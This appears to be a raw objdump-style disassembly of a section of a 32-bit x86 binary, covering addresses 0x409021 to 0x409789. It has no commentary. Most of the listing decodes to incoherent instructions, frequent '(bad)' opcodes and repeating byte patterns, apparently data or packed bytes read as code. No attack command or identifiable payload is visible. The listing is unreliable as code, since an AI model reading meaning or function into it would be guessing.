  409021:	or     ebp,DWORD PTR [ebx+edx*2]
  409024:	sbb    bl,BYTE PTR [edx]
  409026:	dec    edx
  409027:	adc    eax,0x8cb27a9c
  40902c:	mov    bl,0xe3
  40902e:	adc    DWORD PTR [edi-0x60fc0f39],eax
  409034:	xor    al,BYTE PTR [edi]
  409036:	bound  edi,QWORD PTR [ebx+0x10]
  409039:	add    al,dl
  40903b:	mov    esp,0x71184b21
  409040:	out    0x3b,eax
  409042:	mov    ebx,0xe50d6a07
  409047:	jp     0x40903f
  409049:	leave  
  40904a:	sbb    eax,0xb253570e
  40904f:	sub    ch,BYTE PTR [edx]
  409051:	lock sub eax,0xb08b831e
  409057:	rcr    edx,1
  409059:	xor    eax,0x8dfe023d
  40905e:	ds es pushf 
  409061:	jne    0x40908d
  409063:	imul   edx,DWORD PTR [ebp+0x28dd9cb3],0x6
  40906a:	bound  eax,QWORD PTR [esi-0x80]
  40906d:	ins    DWORD PTR es:[edi],dx
  40906e:	cmc    
  40906f:	ficom  DWORD PTR [edx]
  409071:	push   edi
  409072:	retf   0x1d11
  409075:	nop
  409076:	sbb    edi,DWORD PTR [ebx+edx*8+0x6a]
  40907a:	or     eax,DWORD PTR [edi+0x3393468d]
  409080:	inc    ebx
  409081:	loope  0x40900b
  409083:	lahf   
  409084:	leave  
  409085:	cli    
  409086:	sahf   
  409087:	hlt    
  409088:	add    DWORD PTR [esp+edx*2-0x58b6a32a],edx
  40908f:	das    
  409090:	or     ch,ch
  409092:	mov    esp,0x282443d
  409097:	push   0x5b
  409099:	outs   dx,BYTE PTR ds:[esi]
  40909a:	sahf   
  40909b:	jp     0x40904b
  40909d:	adc    eax,0x220bb300
  4090a2:	push   edx
  4090a3:	xchg   ecx,eax
  4090a4:	and    eax,0x681412c3
  4090a9:	test   BYTE PTR [esi+edx*2+0x2d065101],bl
  4090b0:	jb     0x40909c
  4090b2:	ja     0x409133
  4090b4:	repz iret 
  4090b6:	stos   BYTE PTR es:[edi],al
  4090b7:	push   ebx
  4090b8:	push   es
  4090b9:	pop    edi
  4090ba:	pushf  
  4090bb:	(bad)  
  4090bc:	pop    ss
  4090bd:	xor    DWORD PTR [esi+ecx*4-0x23967384],esi
  4090c4:	add    ebp,0x1f
  4090c7:	scas   al,BYTE PTR es:[edi]
  4090c8:	(bad)
  4090cb:	sbb    BYTE PTR [ebx-0x68],dl
  4090ce:	xchg   BYTE PTR [edi+0x46],ch
  4090d1:	(bad)  
  4090d2:	(bad)
  4090d6:	mov    dh,0xc7
  4090d8:	jg     0x4090c5
  4090da:	mov    al,0xa
  4090dc:	aas    
  4090dd:	adc    eax,0x16edf10
  4090e2:	es sub cl,bl
  4090e5:	nop
  4090e6:	fidivr DWORD PTR [ebx]
  4090e8:	adc    eax,0xcb31f7f0
  4090ed:	xor    al,0x6f
  4090ef:	mov    DWORD PTR [esi-0x37],ecx
  4090f2:	add    ebx,ecx
  4090f4:	es dec eax
  4090f6:	fild   WORD PTR [eax]
  4090f8:	xchg   DWORD PTR [ecx-0x9e074fb],esi
  4090fe:	test   DWORD PTR [esi-0x27],ebp
  409101:	jno    0x40909d
  409103:	add    cl,dh
  409105:	adc    DWORD PTR [eax+0x42],edi
  409108:	fdiv   DWORD PTR [esi]
  40910a:	pusha  
  40910b:	scas   eax,DWORD PTR es:[edi]
  40910c:	add    dh,BYTE PTR [ebp-0x479c0fb0]
  409112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409113:	lahf   
  409114:	pop    edx
  409115:	mov    cl,0xd4
  409117:	addr16 and cl,cl
  40911a:	or     cl,BYTE PTR [edx+0x37ce94a6]
  409120:	ins    DWORD PTR es:[edi],dx
  409121:	sar    BYTE PTR [edi-0x4e860040],1
  409127:	mov    esp,0xc8226e9b
  40912c:	(bad)  
  40912d:	and    DWORD PTR [edi],ecx
  40912f:	xor    edi,DWORD PTR [edx+eiz*1-0x6312dc8]
  409136:	mov    cl,0xe7
  409138:	inc    esp
  409139:	inc    edi
  40913a:	aam    0x4c
  40913c:	addr16 inc ecx
  40913e:	inc    edx
  40913f:	and    DWORD PTR [ebx],0xffffffb8
  409142:	(bad)  
  409143:	stc    
  409144:	mov    eax,ds:0x3515b0ee
  409149:	adc    al,0x42
  40914b:	sub    eax,0x87e6d338
  409150:	inc    ecx
  409151:	mov    bh,BYTE PTR [ecx]
  409153:	jmp    0x928264e5
  409158:	jl     0x409145
  40915a:	mov    cl,bh
  40915c:	lock enter 0xa900,0xdc
  409161:	arpl   WORD PTR [ebx+esi*2+0x7eca0733],si
  409168:	add    BYTE PTR [ecx+0x2e],ch
  40916b:	cmp    eax,0x7a58b00b
  409170:	mov    ebp,0x2bf3ffd4
  409175:	add    eax,0xe694d746
  40917a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40917b:	or     ah,BYTE PTR [eax+0x7100bf12]
  409181:	jae    0x4091cd
  409183:	xor    BYTE PTR [esi-0x1fcce1b9],bl
  409189:	jno    0x409145
  40918b:	daa    
  40918c:	jp     0x40918e
  40918e:	mov    DWORD PTR [esi+0x41372788],eax
  409194:	push   cs
  409195:	ret    
  409196:	cmp    ch,bh
  409198:	lock fisttp DWORD PTR [ebp+eax*2+0x37264d26]
  4091a0:	stos   DWORD PTR es:[edi],eax
  4091a1:	or     al,0x73
  4091a3:	aaa    
  4091a4:	pop    esp
  4091a5:	adc    al,0x27
  4091a7:	aaa    
  4091a8:	mov    ecx,DWORD PTR [ecx+edi*1]
  4091ab:	aaa    
  4091ac:	cmp    eax,0xdebf534
  4091b1:	bswap  edi
  4091b3:	mov    edx,0xac93b36e
  4091b8:	scas   al,BYTE PTR es:[edi]
  4091b9:	inc    eax
  4091ba:	pop    ecx
  4091bb:	pushf  
  4091bc:	add    cl,ch
  4091be:	push   esi
  4091bf:	pop    eax
  4091c0:	mov    al,ds:0xda80a1e6
  4091c5:	shl    BYTE PTR ds:0xccbb3f9c,cl
  4091cb:	pushfw 
  4091cd:	add    BYTE PTR [ebp-0x2c],dl
  4091d0:	pusha  
  4091d1:	(bad)  
  4091d2:	sub    dh,BYTE PTR ds:0xa83d553a
  4091d8:	cwde   
  4091d9:	add    BYTE PTR [esi-0x39],ah
  4091dc:	in     al,dx
  4091dd:	fcmove st,st(7)
  4091df:	sahf   
  4091e0:	scas   al,BYTE PTR es:[edi]
  4091e1:	xchg   edx,eax
  4091e2:	mov    ecx,0x6bd98986
  4091e7:	push   cs
  4091e8:	adc    DWORD PTR [ebx+eax*1+0x16],ebp
  4091ec:	pop    ecx
  4091ed:	dec    ecx
  4091ee:	out    dx,al
  4091ef:	xlat   BYTE PTR ds:[ebx]
  4091f0:	fistp  DWORD PTR [ebp-0x351cc5cd]
  4091f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091f7:	arpl   WORD PTR [ecx-0x5a],bx
  4091fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091fb:	(bad)  
  4091fc:	(bad)  
  4091fd:	jnp    0x40919d
  4091ff:	dec    DWORD PTR ds:0xf1621dc0
  409205:	and    esi,DWORD PTR ds:0xc3929414
  40920b:	aam    0xb2
  40920d:	stc    
  40920e:	in     al,0x37
  409210:	and    DWORD PTR [esi+0x4a],esp
  409213:	fadd   DWORD PTR [eax]
  409215:	add    BYTE PTR [ebx],bh
  409217:	(bad)  
  409218:	add    BYTE PTR [eax],al
  40921a:	cmp    eax,ebx
  40921c:	add    BYTE PTR [eax],al
  40921e:	dec    ecx
  40921f:	(bad)  
  409220:	add    BYTE PTR [eax],al
  409222:	dec    edx
  409223:	xlat   BYTE PTR ds:[ebx]
  409224:	add    BYTE PTR [eax],al
  409226:	inc    edi
  409227:	(bad)  
  409228:	add    BYTE PTR [eax],al
  40922a:	cmp    edi,edx
  40922c:	add    BYTE PTR [eax],al
  40922e:	add    eax,0xd6
  409233:	or     edx,esi
  409235:	add    BYTE PTR [eax],al
  409237:	sti    
  409238:	aad    0x0
  40923a:	add    bl,bh
  40923c:	aad    0x0
  40923e:	add    BYTE PTR [ebx],cl
  409240:	(bad)  
  409241:	add    BYTE PTR [eax],al
  409243:	or     edx,esi
  409245:	add    BYTE PTR [eax],al
  409247:	sti    
  409248:	aad    0x0
  40924a:	add    bl,bh
  40924c:	aad    0x0
  40924e:	add    bl,cl
  409250:	aad    0x0
  409252:	add    BYTE PTR [edx+0x40],ah
  409255:	jecxz  0x409256
  409257:	sbb    BYTE PTR [edi+eiz*8],0x25
  40925b:	jge    0x40929d
  40925d:	add    ch,BYTE PTR [edx]
  40925f:	mov    DWORD PTR [eax-0x21],eax
  409262:	sub    eax,0x31d37062
  409267:	jno    0x4092d5
  409269:	xlat   BYTE PTR ds:[ebx]
  40926a:	xor    eax,0xffcbf86d
  40926f:	popf   
  409270:	aas    
  409271:	add    al,BYTE PTR [eax]
  409273:	bound  eax,QWORD PTR [eax-0x5b]
  409276:	popa   
  409277:	add    DWORD PTR [edi+ebx*4-0x6478029b],ebx
  40927e:	imul   ecx,DWORD PTR [ecx],0x56d97a4
  409284:	lock xchg ebx,eax
  409286:	jno    0x409279
  409288:	jmp    0x409219
  40928a:	jne    0x409279
  40928c:	test   DWORD PTR [ebx+0x2426279],0xa3e2b55e
  409296:	popa   
  409297:	add    cl,al
  409299:	(bad)  
  40929a:	lahf   
  40929b:	gs mov ebp,0xc9699bca
  4092a1:	ficom  WORD PTR [edi-0x6acd3a93]
  4092a7:	jno    0x40925a
  4092a9:	es xchg ecx,eax
  4092ab:	jne    0x40925a
  4092ad:	cmp    cl,BYTE PTR [ebp+0x20e6279]
  4092b3:	jle    0x409317
  4092b5:	inc    edx
  4092b6:	add    al,BYTE PTR [eax]
  4092b8:	bound  eax,QWORD PTR [edx+0x2]
  4092bb:	add    BYTE PTR [edx+0x42],ah
  4092be:	add    al,BYTE PTR [eax]
  4092c0:	bound  eax,QWORD PTR [edx+0x2]
  4092c3:	add    BYTE PTR [edx+0x42],ah
  4092c6:	add    al,BYTE PTR [eax]
  4092c8:	bound  eax,QWORD PTR [edx+0x2]
  4092cb:	add    BYTE PTR [edx-0x27],ah
  4092ce:	out    0x3,eax
  4092d0:	(bad)  
  4092d1:	(bad)  
  4092d3:	add    esp,DWORD PTR [edx-0x27]
  4092d6:	out    0x3,eax
  4092d8:	(bad)  
  4092d9:	(bad)  
  4092db:	add    esp,DWORD PTR [edx-0x27]
  4092de:	out    0x3,eax
  4092e0:	(bad)  
  4092e1:	(bad)  
  4092e3:	add    esp,DWORD PTR [edx-0x27]
  4092e6:	out    0x3,eax
  4092e8:	(bad)  
  4092e9:	(bad)  
  4092eb:	add    esp,DWORD PTR [edx-0x27]
  4092ee:	out    0x3,eax
  4092f0:	(bad)  
  4092f1:	(bad)  
  4092f3:	add    esp,DWORD PTR [edx-0x27]
  4092f6:	out    0x3,eax
  4092f8:	(bad)  
  4092f9:	(bad)  
  4092fb:	add    eax,DWORD PTR [eax]
  4092fd:	(bad)  
  4092fe:	(bad)  
  409300:	add    esp,DWORD PTR [edx-0x27]
  409303:	out    0x3,eax
  409305:	(bad)  
  409306:	(bad)  
  409308:	add    esp,DWORD PTR [edx-0x27]
  40930b:	out    0x3,eax
  40930d:	(bad)  
  40930e:	(bad)  
  409310:	add    esp,DWORD PTR [edx-0x27]
  409313:	out    0x3,eax
  409315:	(bad)  
  409316:	(bad)  
  409318:	add    esp,DWORD PTR [edx-0x27]
  40931b:	out    0x3,eax
  40931d:	(bad)  
  40931e:	(bad)  
  409320:	add    esp,DWORD PTR [edx-0x27]
  409323:	out    0x3,eax
  409325:	(bad)  
  409326:	(bad)  
  409328:	add    esp,DWORD PTR [edx-0x27]
  40932b:	out    0x3,eax
  40932d:	(bad)  
  40932e:	(bad)  
  409330:	add    esp,DWORD PTR [edx-0x27]
  409333:	out    0x3,eax
  409335:	(bad)  
  409336:	fst    DWORD PTR [esi+0xa]
  409339:	or     eax,0x50a4f30
  40933e:	xor    BYTE PTR [edi+0xa],al
  409341:	std    
  409342:	das    
  409343:	aas    
  409344:	or     dh,ch
  409346:	das    
  409347:	add    DWORD PTR [esi],esi
  409349:	pop    eax
  40934a:	xor    dh,bh
  40934c:	cs pop eax
  40934e:	xor    dh,bh
  409350:	es push 0x681efe30
  409356:	xor    dh,bh
  409358:	push   ss
  409359:	pop    eax
  40935a:	xor    dh,bh
  40935c:	push   cs
  40935d:	pop    eax
  40935e:	xor    dh,bh
  409360:	push   es
  409361:	add    BYTE PTR [eax+0x30],ch
  409364:	(bad)  
  409365:	(bad)  
  409366:	imul   esi,DWORD PTR [eax],0xfffffffe
  409369:	jmp    0xe5426ed4
  40936e:	(bad)  
  40936f:	xlat   BYTE PTR ds:[ebx]
  409370:	add    eax,0xfe2e98f1
  409375:	fisubr WORD PTR [ebx+0x30]
  409378:	(bad)  
  409379:	(bad)  
  40937a:	mov    edx,fs
  40937c:	or     al,0xdc
  40937e:	mov    ebx,esi
  409380:	std    
  409381:	(bad)  
  409382:	imul   esi,DWORD PTR [eax],0xfffffffe
  409385:	mov    esi,0xb6fe306b
  40938a:	pop    ebx
  40938b:	xor    dh,bh
  40938d:	scas   al,BYTE PTR es:[edi]
  40938e:	pop    ebx
  40938f:	xor    dh,bh
  409391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409392:	imul   ebp,DWORD PTR [esi],0xfffffffe
  409395:	sahf   
  409396:	imul   ebp,DWORD PTR [esi],0xfffffffe
  409399:	xchg   esi,eax
  40939a:	dec    esp
  40939b:	in     al,0xc
  40939d:	fmul   QWORD PTR [ebx-0x20]
  4093a0:	std    
  4093a1:	xchg   BYTE PTR [ebx+0x2e],ch
  4093a4:	(bad)  
  4093a5:	jle    0x409412
  4093a7:	cs (bad) 
  4093a9:	jbe    0x409406
  4093ab:	cs (bad) 
  4093ad:	outs   dx,BYTE PTR ds:[esi]
  4093ae:	pop    ebx
  4093af:	cs (bad) 
  4093b1:	imul   bp,WORD PTR [esi],0xfffe
  4093b5:	pop    esi
  4093b6:	imul   ebp,DWORD PTR [esi],0xfffffffe
  4093b9:	jmp    0xe9416d1f
  4093be:	popa   
  4093bf:	fld    DWORD PTR [eax]
  4093c1:	add    BYTE PTR [ebx],cl
  4093c3:	fild   DWORD PTR [eax]
  4093c5:	add    BYTE PTR [eax],al
  4093c7:	or     ebx,ebx
  4093c9:	add    BYTE PTR [eax],al
  4093cb:	sti    
  4093cc:	fiadd  DWORD PTR [eax]
  4093ce:	add    bl,bh
  4093d0:	fiadd  DWORD PTR [eax]
  4093d2:	add    bl,cl
  4093d4:	fiadd  DWORD PTR [eax]
  4093d6:	add    bl,cl
  4093d8:	fiadd  DWORD PTR [eax]
  4093da:	add    BYTE PTR [ebx-0x44ffff26],bh
  4093e0:	fiadd  DWORD PTR [eax]
  4093e2:	add    bl,cl
  4093e4:	fiadd  DWORD PTR [eax]
  4093e6:	add    bl,cl
  4093e8:	fiadd  DWORD PTR [eax]
  4093ea:	add    BYTE PTR [ebx-0x44ffff26],bh
  4093f0:	fiadd  DWORD PTR [eax]
  4093f2:	add    BYTE PTR [ebx-0x74ffff26],cl
  4093f8:	fiadd  DWORD PTR [eax]
  4093fa:	add    BYTE PTR [ebx-0x26],bh
  4093fd:	add    BYTE PTR [eax],al
  4093ff:	jnp    0x4093db
  409401:	add    BYTE PTR [eax],al
  409403:	mov    ebx,edx
  409405:	add    BYTE PTR [eax],al
  409407:	mov    ebx,edx
  409409:	add    BYTE PTR [eax],al
  40940b:	jnp    0x4093e7
  40940d:	add    BYTE PTR [eax],al
  40940f:	jnp    0x4093eb
  409411:	add    BYTE PTR [eax],al
  409413:	dec    ebx
  409414:	fiadd  DWORD PTR [eax]
  409416:	add    BYTE PTR [ebx-0x26],cl
  409419:	add    BYTE PTR [eax],al
  40941b:	cmp    ebx,edx
  40941d:	add    BYTE PTR [eax],al
  40941f:	cmp    ebx,edx
  409421:	add    BYTE PTR [eax],al
  409423:	dec    ebx
  409424:	fiadd  DWORD PTR [eax]
  409426:	add    BYTE PTR [ebx-0x26],cl
  409429:	add    BYTE PTR [eax],al
  40942b:	add    BYTE PTR [ebx],bh
  40942d:	fiadd  DWORD PTR [eax]
  40942f:	add    BYTE PTR [ebx],bh
  409431:	fiadd  DWORD PTR [eax]
  409433:	add    BYTE PTR [ebx],cl
  409435:	fiadd  DWORD PTR [eax]
  409437:	add    BYTE PTR [ebx],cl
  409439:	fiadd  DWORD PTR [eax]
  40943b:	add    BYTE PTR [edx+0x40],ah
  40943e:	add    al,BYTE PTR [eax]
  409440:	bound  eax,QWORD PTR [eax+0x2]
  409443:	add    BYTE PTR [edx+0x40],ah
  409446:	add    al,BYTE PTR [eax]
  409448:	bound  eax,QWORD PTR [eax+0x2]
  40944b:	add    BYTE PTR [edx+0x40],ah
  40944e:	add    al,BYTE PTR [eax]
  409450:	bound  eax,QWORD PTR [eax+0x2]
  409453:	add    BYTE PTR [edx+0x40],ah
  409456:	add    al,BYTE PTR [eax]
  409458:	bound  eax,QWORD PTR [eax+0x2]
  40945b:	add    BYTE PTR [edx+0x40],ah
  40945e:	add    eax,DWORD PTR [ecx]
  409460:	bound  eax,QWORD PTR [ecx+0x3]
  409463:	add    DWORD PTR [ebx+0x41],esp
  409466:	add    eax,DWORD PTR [ecx]
  409468:	arpl   WORD PTR [ecx+0x3],ax
  40946b:	add    DWORD PTR [ebx+0x41],esp
  40946e:	add    eax,DWORD PTR [ecx]
  409470:	arpl   WORD PTR [ecx+0x3],ax
  409473:	add    DWORD PTR [ebx+0x41],esp
  409476:	add    eax,0x5416301
  40947b:	add    DWORD PTR [edx+0x41],esp
  40947e:	add    eax,0x5416301
  409483:	add    DWORD PTR [ebx+0x41],esp
  409486:	add    eax,0x5416301
  40948b:	add    DWORD PTR [ebx+0x41],esp
  40948e:	add    eax,0x41630001
  409493:	add    eax,0x5416301
  409498:	add    DWORD PTR [ebx+0x41],esp
  40949b:	add    eax,0x5416301
  4094a0:	add    DWORD PTR [ebx+0x41],esp
  4094a3:	add    eax,0x5416301
  4094a8:	add    DWORD PTR [ebx+0x41],esp
  4094ab:	add    eax,0x5416301
  4094b0:	add    DWORD PTR [ebx+0x41],esp
  4094b3:	add    eax,0xe8d96301
  4094b8:	add    al,0x63
  4094ba:	(bad)  
  4094bc:	add    al,0x63
  4094be:	(bad)  
  4094c0:	add    esp,DWORD PTR [edx-0x27]
  4094c3:	out    0x3,eax
  4094c5:	(bad)  
  4094c6:	(bad)  
  4094c8:	add    esp,DWORD PTR [edx-0x27]
  4094cb:	out    0x3,eax
  4094cd:	(bad)  
  4094ce:	(bad)  
  4094d0:	add    esp,DWORD PTR [edx-0x27]
  4094d3:	out    0x3,eax
  4094d5:	(bad)  
  4094d6:	(bad)  
  4094d8:	add    esp,DWORD PTR [edx-0x27]
  4094db:	out    0x3,eax
  4094dd:	(bad)  
  4094de:	(bad)  
  4094e0:	add    esp,DWORD PTR [edx-0x27]
  4094e3:	out    0x3,eax
  4094e5:	(bad)  
  4094e6:	(bad)  
  4094e8:	add    esp,DWORD PTR [edx-0x27]
  4094eb:	out    0x3,eax
  4094ed:	(bad)  
  4094ee:	(bad)  
  4094f0:	add    esp,DWORD PTR [edx-0x27]
  4094f3:	out    0x3,eax
  4094f5:	add    BYTE PTR [edx-0x27],ah
  4094f8:	out    0x3,eax
  4094fa:	(bad)  
  4094fb:	(bad)  
  4094fd:	add    esp,DWORD PTR [edx-0x27]
  409500:	out    0x3,eax
  409502:	(bad)  
  409503:	(bad)  
  409505:	add    esp,DWORD PTR [edx-0x27]
  409508:	out    0x3,eax
  40950a:	(bad)  
  40950b:	(bad)  
  40950d:	add    esp,DWORD PTR [edx-0x27]
  409510:	out    0x3,eax
  409512:	(bad)  
  409513:	(bad)  
  409515:	add    esp,DWORD PTR [edx-0x27]
  409518:	out    0x3,eax
  40951a:	(bad)  
  40951b:	(bad)  
  40951d:	add    esp,DWORD PTR [edx-0x27]
  409520:	out    0x3,eax
  409522:	(bad)  
  409523:	(bad)  
  409525:	add    esp,DWORD PTR [edx-0x27]
  409528:	out    0x3,eax
  40952a:	(bad)  
  40952b:	(bad)  
  40952d:	add    esp,DWORD PTR [edx-0x27]
  409530:	add    cl,ch
  409532:	popa   
  409533:	fld    DWORD PTR [eax]
  409535:	jmp    0xe9416e9b
  40953a:	popa   
  40953b:	fld    DWORD PTR [eax]
  40953d:	jmp    0x8a416ea3
  409542:	popa   
  409543:	fld    DWORD PTR [eax]
  409545:	inc    ebx
  409546:	(bad)  
  409547:	xchg   esi,eax
  409548:	add    BYTE PTR [ebp+0x2700d961],cl
  40954e:	rcl    DWORD PTR [esi-0x269e7400],cl
  409554:	add    BYTE PTR [edi+0x4f0096f0],dl
  40955a:	add    BYTE PTR [ecx-0x27],ah
  40955d:	add    BYTE PTR [edx],ch
  40955f:	lock xchg esi,eax
  409561:	add    BYTE PTR [esi+0x61],cl
  409564:	fld    DWORD PTR [eax]
  409566:	pop    ebp
  409567:	in     eax,dx
  409568:	xchg   esi,eax
  409569:	add    BYTE PTR [ecx+0x61],dl
  40956c:	fld    DWORD PTR [eax]
  40956e:	push   esp
  40956f:	fst    QWORD PTR [esi-0x269ec000]
  409575:	add    BYTE PTR [ebp+ebp*8-0x6a],dl
  409579:	add    BYTE PTR [ebx+0x7c00d95e],dl
  40957f:	hlt    
  409580:	xchg   esi,eax
  409581:	add    BYTE PTR [edx-0x6aff26a2],al
  409587:	aam    0x96
  409589:	add    BYTE PTR [ebp-0x4dff26a2],dl
  40958f:	aam    0x96
  409591:	add    BYTE PTR [esi+ebx*2-0xb73ff27],al
  409598:	xchg   edi,eax
  409599:	add    BYTE PTR [edi+0x5e],dl
  40959c:	fld    DWORD PTR [eax]
  40959e:	jg     0x409592
  4095a0:	xchg   edi,eax
  4095a1:	add    BYTE PTR [esi+0x5e],al
  4095a4:	fld    DWORD PTR [eax]
  4095a6:	cli    
  4095a7:	in     al,dx
  4095a8:	xchg   edi,eax
  4095a9:	add    BYTE PTR [eax],al
  4095ab:	jnp    0x409582
  4095ad:	add    BYTE PTR [eax],al
  4095af:	enter  0x435a,0x0
  4095b3:	push   0xffffffd5
  4095b5:	add    BYTE PTR [eax],al
  4095b7:	lahf   
  4095b8:	pop    ebx
  4095b9:	inc    ebx
  4095ba:	add    cl,bh
  4095bc:	aad    0x0
  4095be:	add    BYTE PTR [eax],al
  4095c0:	mov    dh,0x5b
  4095c2:	inc    ebx
  4095c3:	add    al,ch
  4095c5:	aad    0x0
  4095c7:	add    BYTE PTR [ebx+eax*2],bh
  4095ca:	inc    ebx
  4095cb:	add    BYTE PTR [edi-0x2b],dh
  4095ce:	add    BYTE PTR [eax],al
  4095d0:	lods   eax,DWORD PTR ds:[esi]
  4095d1:	mov    al,0x3f
  4095d3:	add    BYTE PTR [esi-0x2b],ah
  4095d6:	add    BYTE PTR [eax],al
  4095d8:	or     eax,0x35003fb1
  4095dd:	aad    0x0
  4095df:	add    BYTE PTR [edx],dl
  4095e1:	inc    edi
  4095e2:	inc    ebx
  4095e3:	add    BYTE PTR [edx*8+0x46fa0000],ah
  4095ea:	inc    ebx
  4095eb:	add    BYTE PTR [ebx],ah
  4095ed:	aad    0x0
  4095ef:	add    BYTE PTR [edx],bl
  4095f1:	inc    ebp
  4095f2:	inc    ebx
  4095f3:	add    BYTE PTR [edx-0x2b],dh
  4095f6:	add    BYTE PTR [eax],al
  4095f8:	pop    ecx
  4095f9:	inc    ebp
  4095fa:	inc    ebx
  4095fb:	add    cl,al
  4095fd:	(bad)  
  4095fe:	add    BYTE PTR [eax],al
  409600:	mov    eax,0xf0004346
  409605:	(bad)  
  409606:	add    BYTE PTR [eax],al
  409608:	repnz inc esi
  40960a:	inc    ebx
  40960b:	add    bh,bl
  40960d:	(bad)  
  40960e:	add    BYTE PTR [eax],al
  409610:	aad    0x47
  409612:	inc    ebx
  409613:	add    dh,ch
  409615:	aad    0x0
  409617:	add    BYTE PTR [ebx],ch
  409619:	inc    edi
  40961a:	inc    ebx
  40961b:	add    BYTE PTR [ecx+0x6400408f],bl
  409621:	pop    DWORD PTR [eax+0x0]
  409624:	add    BYTE PTR [edx-0x67],ah
  409627:	push   edi
  409628:	inc    eax
  409629:	(bad)  
  40962a:	out    dx,al
  40962b:	pop    edx
  40962c:	inc    eax
  40962d:	(bad)  
  40962e:	fistp  DWORD PTR [edx+0x40]
  409631:	bound  ecx,QWORD PTR [ecx+0x38624057]
  409637:	pop    eax
  409638:	inc    eax
  409639:	bound  edi,QWORD PTR [edi+0x58]
  40963c:	inc    eax
  40963d:	bound  ebx,QWORD PTR [ecx]
  40963f:	mov    esi,0xddf6a046
  409644:	cmp    BYTE PTR ds:0x62000240,bh
  40964a:	push   ecx
  40964b:	ins    BYTE PTR es:[edi],dx
  40964c:	or     edi,0xffffffe4
  40964f:	popa   
  409650:	test   esp,esp
  409652:	mov    ebp,0xea62006a
  409657:	xor    edi,ecx
  409659:	stos   DWORD PTR es:[edi],eax
  40965a:	aas    
  40965b:	add    al,BYTE PTR [eax]
  40965d:	bound  ebx,QWORD PTR [edx-0x47]
  409660:	dec    eax
  409661:	xor    BYTE PTR [esp+esi*4+0x56],dh
  409665:	push   ebp
  409666:	popa   
  409667:	mov    ebx,0xc27d2b40
  40966c:	push   DWORD PTR [ebp+0x326a9b7b]
  409672:	push   edx
  409673:	xchg   esi,eax
  409674:	je     0x4096ed
  409676:	inc    edi
  409677:	lea    edi,[ebx+ecx*1+0x40]
  40967b:	add    al,BYTE PTR [eax]
  40967d:	bound  esi,QWORD PTR [ecx]
  40967f:	ds ds inc edi
  409682:	iret   
  409683:	cmp    esp,DWORD PTR [eax]
  409685:	or     ah,BYTE PTR [ebx]
  409687:	cmp    DWORD PTR [ebx],edi
  409689:	add    BYTE PTR [esi+eax*8],dh
  40968c:	cmp    dh,BYTE PTR [edx]
  40968e:	cmp    BYTE PTR [eax+0x2],al
  409691:	add    BYTE PTR [edx+0x5d],ah
  409694:	xchg   ebx,eax
  409695:	mov    eax,ds
  409697:	xchg   DWORD PTR [edi-0x7542f33a],ebx
  40969d:	mov    cl,ah
  40969f:	fnstenv [eax-0x6d]
  4096a2:	out    0xd9,al
  4096a4:	add    DWORD PTR [ecx+0x77],eax
  4096a7:	cld    
  4096a8:	shl    BYTE PTR [eax],1
  4096aa:	(bad)  
  4096ab:	in     al,0x2
  4096ad:	push   es
  4096ae:	mov    bh,bh
  4096b0:	aam    0x2a
  4096b2:	jnp    0x4096ac
  4096b4:	rol    BYTE PTR [ebx],0x62
  4096b7:	fnstcw WORD PTR [ebx]
  4096b9:	xchg   bl,ah
  4096bb:	pop    ecx
  4096bc:	pop    eax
  4096bd:	mov    dh,bl
  4096bf:	fnstenv [esi-0x44269d9e]
  4096c5:	sub    ebx,DWORD PTR [esi+0x6203e79d]
  4096cb:	fxch   st(0)
  4096cd:	push   edx
  4096ce:	pop    ebp
  4096cf:	mov    edi,0x92a54caa
  4096d4:	mov    al,0x47
  4096d6:	pushf  
  4096d7:	xlat   BYTE PTR ds:[ebx]
  4096d8:	mov    esi,0x8c9d2a4f
  4096dd:	add    esp,DWORD PTR [edx-0x27]
  4096e0:	xchg   bp,ax
  4096e2:	stos   BYTE PTR es:[edi],al
  4096e3:	fs jge 0x409687
  4096e6:	out    dx,al
  4096e7:	add    eax,0x47e5a25b
  4096ec:	jp     0x4096f2
  4096ee:	add    BYTE PTR [edx-0x27],ah
  4096f1:	lock popa 
  4096f3:	push   esi
  4096f4:	sti    
  4096f5:	leave  
  4096f6:	add    esp,DWORD PTR [edx-0x27]
  4096f9:	mov    eax,0xace84024
  4096fe:	cmp    DWORD PTR [ebp-0x4],ecx
  409701:	sbb    BYTE PTR [edx],bh
  409703:	push   esi
  409704:	lods   eax,DWORD PTR ds:[esi]
  409705:	add    esi,DWORD PTR [ebx+edi*1-0xf]
  409709:	push   ds
  40970a:	jo     0x409752
  40970c:	cmc    
  40970d:	adc    eax,0x1eb092c
  409712:	sub    DWORD PTR ds:0x38260efe,edi
  409718:	repz add ch,bl
  40971b:	popa   
  40971c:	fld    DWORD PTR [eax]
  40971e:	inc    ebp
  40971f:	(bad)  
  409720:	mov    bl,0x60
  409722:	and    al,0xc7
  409724:	test   al,0x71
  409726:	jmp    0xc041708c
  40972b:	mov    ?,edx
  40972d:	and    al,cl
  40972f:	jne    0x409728
  409731:	add    BYTE PTR [ebp-0x27],bl
  409734:	dec    edi
  409735:	sub    ecx,0xc000d961
  40973b:	loop   0x409729
  40973d:	sub    BYTE PTR [ebp-0x76ff26c3],ch
  409743:	and    ah,BYTE PTR [esi-0x46]
  409746:	sahf   
  409747:	or     BYTE PTR [ecx],bh
  409749:	loope  0x409734
  40974b:	popa   
  40974c:	fld    DWORD PTR [eax]
  40974e:	dec    esp
  40974f:	add    DWORD PTR [ebx],edi
  409751:	out    0x92,eax
  409753:	add    BYTE PTR [eax],ah
  409755:	fs add ebp,ebx
  409758:	jnp    0x40970d
  40975a:	addr16 mov edx,0xca60c04a
  409760:	dec    ebp
  409761:	mov    ecx,0xb2389863
  409766:	jge    0x4096ee
  409768:	inc    edi
  409769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40976a:	je     0x40974d
  40976c:	popa   
  40976d:	fld    DWORD PTR [eax]
  40976f:	sbb    DWORD PTR [esi],0x10ae499b
  409775:	shr    BYTE PTR [ecx-0x52],cl
  409778:	or     eax,0x47af4793
  40977d:	mov    ebx,0x892e9c48
  409782:	push   ebx
  409783:	aaa    
  409784:	sub    ebx,ecx
  409786:	add    bl,al
  409788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409789:	pop    eax
